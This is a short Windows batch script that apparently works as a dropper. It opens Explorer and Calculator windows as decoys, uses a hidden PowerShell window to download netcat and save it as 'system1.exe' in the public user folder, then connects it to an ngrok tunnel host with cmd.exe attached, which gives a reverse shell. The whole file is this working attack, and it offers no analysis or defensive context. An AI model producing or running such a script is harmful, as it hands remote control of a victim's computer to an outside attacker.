@echo off
start explorer
start explorer
start calc
powershell -WindowStyle Hidden -c "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Wh0ami0x0/dll123/blob/master/nc.exe','c:\users\public\system1.exe')"
cd /users/public
system1.exe 0.tcp.ngrok.io 15712 -e cmd.exe
